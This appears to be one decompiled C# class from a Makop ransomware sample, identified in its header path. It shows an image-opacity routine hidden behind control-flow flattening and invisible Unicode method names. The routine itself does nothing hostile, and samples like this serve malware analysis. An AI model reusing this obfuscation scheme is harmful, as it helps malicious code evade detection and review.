// Decompiled with JetBrains decompiler
// Type: ImageUtil
// Assembly: غج, Version=2.159.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 646F7626-F199-493A-B5BB-FA317F4F75E5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Makop.gen-7bd25c50eebc6f91a77977f299f7080a7ba1825fe1953c76801546cc96342b39.exe

using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;

public static class ImageUtil
{
  private const int bytesPerPixel = 4;

  public static Image Opacity(Image originalImage, double opacity)
  {
label_1:
    int num1 = -1031956979;
    int num2;
    byte[] numArray;
    Image image;
    int num3;
    Bitmap bitmap;
    int length;
    PixelFormat pixelFormat;
    BitmapData bitmapData;
    IntPtr num4;
    Rectangle rectangle;
    while (true)
    {
      uint num5;
      switch ((num5 = (uint) (num1 ^ -203154777)) % 27U)
      {
        case 0:
          num1 = (int) num5 * 1111183365 ^ -708886963;
          continue;
        case 1:
          numArray = new byte[length];
          num1 = (int) num5 * -1173363636 ^ 45746039;
          continue;
        case 2:
          bitmap = (Bitmap) ImageUtil.\u206B​‬⁬⁮‎​‍⁯‌‭⁯‫⁮‬‬‬‪‌‫‌⁪​‏‭⁭‭‫‌⁭‪‭⁯‍‮‏‭⁪⁮⁪‮(originalImage);
          pixelFormat = PixelFormat.Format32bppArgb;
          num1 = -345939956;
          continue;
        case 3:
          num1 = (int) num5 * -354966341 ^ 1701205587;
          continue;
        case 4:
          num1 = (int) num5 * -618560667 ^ 740187207;
          continue;
        case 5:
          int num6 = numArray[num2 + 4 - 1] != (byte) 0 ? -1132570836 : (num6 = -926849164);
          num1 = num6 ^ (int) num5 * 1552089242;
          continue;
        case 6:
          ++num3;
          num1 = (int) num5 * -1806965332 ^ 481060354;
          continue;
        case 7:
          num3 = 0 + 1;
          num1 = -1715943439;
          continue;
        case 8:
          num1 = (int) num5 * 1223985711 ^ 7417670;
          continue;
        case 9:
          num1 = -332300648;
          continue;
        case 10:
          image = (Image) bitmap;
          num1 = (int) num5 * 1870122707 ^ 1834492850;
          continue;
        case 12:
          rectangle = new Rectangle(0, 0, ImageUtil.\u200E‭‍‭‪⁭‌⁪⁪⁯‪⁫⁯‎​‍‫⁪‭‫‮⁫⁭⁬⁬‏‮⁭‮⁬‭‎‪⁮⁭‌‪‏‫‎‮((Image) bitmap), ImageUtil.\u202C‮‭‎⁯⁪⁪‮⁪‮⁭⁯‭‌‮‍‏‮‏‏⁪⁫‏‏​‌⁫‪‏‎‮‌‍⁯⁯‮​‭‮⁮‮((Image) bitmap));
          num1 = (int) num5 * 743909459 ^ 1493673549;
          continue;
        case 13:
          goto label_1;
        case 14:
          int num7 = (ImageUtil.\u202D‎‮‎‎⁪​⁮‮⁬‮‪⁫⁬‏‍⁮‌‭⁪⁫‮​‏⁮‭‭‪⁫‫‫‪‮‫‌‫‍‍‭‫‮(originalImage) & PixelFormat.Indexed) != PixelFormat.Indexed ? -1369442378 : (num7 = -1502471935);
          num1 = num7 ^ (int) num5 * -812846423;
          continue;
        case 15:
          image = originalImage;
          num1 = (int) num5 * 1531576250 ^ -652297773;
          continue;
        case 16:
          bitmapData = ImageUtil.\u202B⁫⁪‏‭‍⁭⁭​​‌‮‬⁫‮‎‪‌‪⁭‪⁬‪⁯‭⁮‬‪⁯⁬⁫‌‭⁪⁪⁫⁯‮​‮‮(bitmap, rectangle, ImageLockMode.ReadWrite, pixelFormat);
          num4 = ImageUtil.\u200D‫⁭‭‌⁮‌‌‬⁪⁬⁭‫⁭⁯‪‪​⁬‎‪‮‏‎⁪‫‬‮⁬⁪‏‮⁮‫⁮‍‫‮‭‎‮(bitmapData);
          num1 = (int) num5 * 1516015458 ^ -1914640697;
          continue;
        case 17:
          num2 = 0;
          num1 = (int) num5 * -538487110 ^ -1486923669;
          continue;
        case 18:
          numArray[num2 + num3] = (byte) ((double) numArray[num2 + num3] * opacity);
          num1 = (int) num5 * -1497630708 ^ 616715244;
          continue;
        case 19:
          ++num3;
          num1 = (int) num5 * 459118625 ^ -1410197542;
          continue;
        case 20:
          int num8;
          num1 = num8 = num2 < numArray.Length ? -1366595845 : (num8 = -1534015951);
          continue;
        case 21:
          ImageUtil.\u202E‮⁭⁪‮‍⁭‪⁬‍‪‫⁭⁫‭⁪‎⁮‫⁯⁮⁬⁪‎‭‍‏‮‬‮‭‍⁪⁬​⁯⁮​‌⁫‮(numArray, 0, num4, length);
          num1 = (int) num5 * -775465235 ^ -37759261;
          continue;
        case 22:
          ImageUtil.\u200F‬⁮‎‫‏⁭⁭‭⁪‭⁭⁯⁭‌‭‭⁪⁪⁯‫‮⁯⁫‭‍‮‮​‭⁯​⁬​​⁫‎⁬⁬⁫‮(bitmap, bitmapData);
          num1 = (int) num5 * -1350327097 ^ 1269673316;
          continue;
        case 23:
          length = ImageUtil.\u200E‭‍‭‪⁭‌⁪⁪⁯‪⁫⁯‎​‍‫⁪‭‫‮⁫⁭⁬⁬‏‮⁭‮⁬‭‎‪⁮⁭‌‪‏‫‎‮((Image) bitmap) * ImageUtil.\u202C‮‭‎⁯⁪⁪‮⁪‮⁭⁯‭‌‮‍‏‮‏‏⁪⁫‏‏​‌⁫‪‏‎‮‌‍⁯⁯‮​‭‮⁮‮((Image) bitmap) * 4;
          num1 = (int) num5 * 650728781 ^ 140965262;
          continue;
        case 24:
          ImageUtil.\u206D‎⁬⁯‬‫‎​⁫‭⁭‫​⁬⁫‭‭⁫⁫‏‭⁭‌⁮‭⁪‌⁭⁪‪⁮‎‫⁫⁯⁫‭⁪‬‮‮(num4, numArray, 0, length);
          num1 = (int) num5 * 1783008072 ^ -1610624650;
          continue;
        case 25:
          num1 = (int) num5 * -1582809060 ^ 1867249002;
          continue;
        case 26:
          num2 += 4;
          num1 = -1712879247;
          continue;
        default:
          goto label_28;
      }
    }
label_28:
    return image;
  }

  static PixelFormat \u202D‎‮‎‎⁪​⁮‮⁬‮‪⁫⁬‏‍⁮‌‭⁪⁫‮​‏⁮‭‭‪⁫‫‫‪‮‫‌‫‍‍‭‫‮([In] Image obj0) => obj0.PixelFormat;

  static object \u206B​‬⁬⁮‎​‍⁯‌‭⁯‫⁮‬‬‬‪‌‫‌⁪​‏‭⁭‭‫‌⁭‪‭⁯‍‮‏‭⁪⁮⁪‮([In] Image obj0) => obj0.Clone();

  static int \u200E‭‍‭‪⁭‌⁪⁪⁯‪⁫⁯‎​‍‫⁪‭‫‮⁫⁭⁬⁬‏‮⁭‮⁬‭‎‪⁮⁭‌‪‏‫‎‮([In] Image obj0) => obj0.Width;

  static int \u202C‮‭‎⁯⁪⁪‮⁪‮⁭⁯‭‌‮‍‏‮‏‏⁪⁫‏‏​‌⁫‪‏‎‮‌‍⁯⁯‮​‭‮⁮‮([In] Image obj0) => obj0.Height;

  static BitmapData \u202B⁫⁪‏‭‍⁭⁭​​‌‮‬⁫‮‎‪‌‪⁭‪⁬‪⁯‭⁮‬‪⁯⁬⁫‌‭⁪⁪⁫⁯‮​‮‮(
    [In] Bitmap obj0,
    [In] Rectangle obj1,
    [In] ImageLockMode obj2,
    [In] PixelFormat obj3)
  {
    return obj0.LockBits(obj1, obj2, obj3);
  }

  static IntPtr \u200D‫⁭‭‌⁮‌‌‬⁪⁬⁭‫⁭⁯‪‪​⁬‎‪‮‏‎⁪‫‬‮⁬⁪‏‮⁮‫⁮‍‫‮‭‎‮([In] BitmapData obj0) => obj0.Scan0;

  static void \u206D‎⁬⁯‬‫‎​⁫‭⁭‫​⁬⁫‭‭⁫⁫‏‭⁭‌⁮‭⁪‌⁭⁪‪⁮‎‫⁫⁯⁫‭⁪‬‮‮(
    [In] IntPtr obj0,
    [In] byte[] obj1,
    [In] int obj2,
    [In] int obj3)
  {
    Marshal.Copy(obj0, obj1, obj2, obj3);
  }

  static void \u202E‮⁭⁪‮‍⁭‪⁬‍‪‫⁭⁫‭⁪‎⁮‫⁯⁮⁬⁪‎‭‍‏‮‬‮‭‍⁪⁬​⁯⁮​‌⁫‮(
    [In] byte[] obj0,
    [In] int obj1,
    [In] IntPtr obj2,
    [In] int obj3)
  {
    Marshal.Copy(obj0, obj1, obj2, obj3);
  }

  static void \u200F‬⁮‎‫‏⁭⁭‭⁪‭⁭⁯⁭‌‭‭⁪⁪⁯‫‮⁯⁫‭‍‮‮​‭⁯​⁬​​⁫‎⁬⁬⁫‮([In] Bitmap obj0, [In] BitmapData obj1) => obj0.UnlockBits(obj1);
}
